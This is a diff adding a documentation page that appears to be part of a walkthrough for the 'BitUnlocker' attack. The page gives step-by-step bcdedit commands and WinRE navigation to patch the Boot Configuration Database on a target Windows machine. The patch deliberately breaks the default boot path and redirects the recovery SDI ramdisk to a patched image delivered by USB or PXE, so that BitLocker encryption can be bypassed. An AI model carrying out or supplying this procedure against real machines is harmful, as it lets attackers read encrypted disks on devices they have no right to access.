@@ -1,0 +1,79 @@
+---
+title: "Modify the BCD to Redirect the SDI Path"
+sidebarTitle: "Modify BCD"
+description: "Step-by-step bcdedit commands to export and patch the Boot Configuration Database, redirecting the ramdisk SDI path to boot_patched.sdi."
+---
+
+The Boot Configuration Database (BCD) controls what the Windows boot manager loads at startup, including which SDI ramdisk image is used for the recovery environment. To carry out the BitUnlocker attack, the BCD on the target machine must be patched so that the `ramdisksdipath` entry for the Windows Recovery boot option points to `boot_patched.sdi` instead of the default `boot.sdi`. This is done using `bcdedit` from within a WinRE command prompt on the target itself.
+
+## Open a WinRE Command Prompt
+
+On the target machine, hold **Shift** while clicking **Restart**, then navigate to **Troubleshoot → Command Prompt**. During this process:
+
+- If you are prompted for a BitLocker recovery key, click **"Ignore this disk"**.
+- If you are told that the command prompt cannot run on a locked device, click **"relaunch"**.
+- If the command prompt still will not open, boot from your own WinPE environment instead.
+
+Once you have a command prompt, plug in your USB stick and follow the steps below.
+
+<Steps>
+
+  <Step title="Change to the USB drive">
+    Switch to the drive letter assigned to your USB stick. Substitute `E:` for the actual letter shown in File Explorer or by running `diskpart`.
+
+    ```bat
+    E:
+    ```
+  </Step>
+
+  <Step title="Export and begin modifying the BCD">
+    Export a copy of the active BCD to a file called `BCD_modded`, then deliberately set the default boot entry's path to a non-existent EFI binary. Finally, enumerate all entries so you can find the recovery GUID in the next step.
+
+    ```bat
+    bcdedit /export BCD_modded
+    bcdedit /store BCD_modded /set {default} path \WINDOWS\system32\winload_DOESNOTEXIST.efi
+    bcdedit /store BCD_modded /enum all
+    ```
+
+    <Warning>
+      Setting the path to `\WINDOWS\system32\winload_DOESNOTEXIST.efi` is **intentional**. Because the boot manager cannot find that binary, it falls back to the recovery path — which is exactly the path we are redirecting to load `boot_patched.sdi`.
+    </Warning>
+  </Step>
+
+  <Step title="Find the Windows Recovery entry">
+    Scroll through the output of `/enum all`. Look for a **device options** entry whose `description` field reads **"Windows Recovery"** and that contains both `ramdisksdidevice` and `ramdisksdipath` properties. Note the GUID shown at the top of that block — it looks like `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`. You will need it in the next step.
+  </Step>
+
+  <Step title="Patch the SDI path">
+    Replace `{GUID}` in the commands below with the actual GUID you noted above. These commands redirect the recovery boot entry to load `boot_patched.sdi` from the boot device, then rename the modified store to `BCD`.
+
+    ```bat
+    bcdedit /store BCD_modded /set {GUID} ramdisksdidevice boot
+    bcdedit /store BCD_modded /set {GUID} ramdisksdipath \sdi\boot_patched.sdi
+    move BCD_modded BCD
+    ```
+
+    <Note>
+      `ramdisksdidevice boot` instructs the boot manager to load the SDI file from the **boot device** — the USB stick or PXE server — rather than from a partition on the local disk. This is what allows the pre-patch `bootmgfw.efi` on your USB stick or TFTP server to serve the patched image.
+    </Note>
+  </Step>
+
+  <Step title="Copy the BCD to the correct location">
+    Move the resulting `BCD` file to the location that matches your delivery method:
+
+    | Method | Destination path |
+    |--------|-----------------|
+    | USB    | `USB/EFI/Microsoft/Boot/BCD` |
+    | PXE    | `TFTP-root/Boot/BCD` |
+
+    For the USB method, this means copying `BCD` to the `EFI/Microsoft/Boot/` folder on the formatted USB stick before booting the target. For PXE, place it in the `Boot/` directory inside `TFTP-root/` on your Linux machine.
+  </Step>
+
+</Steps>
+
+## Next Steps
+
+With the BCD in place, you are ready to boot the target:
+
+- **USB delivery:** continue to [USB Boot](/walkthrough/usb-boot).
+- **PXE delivery:** continue to [PXE Boot](/walkthrough/pxe-boot).
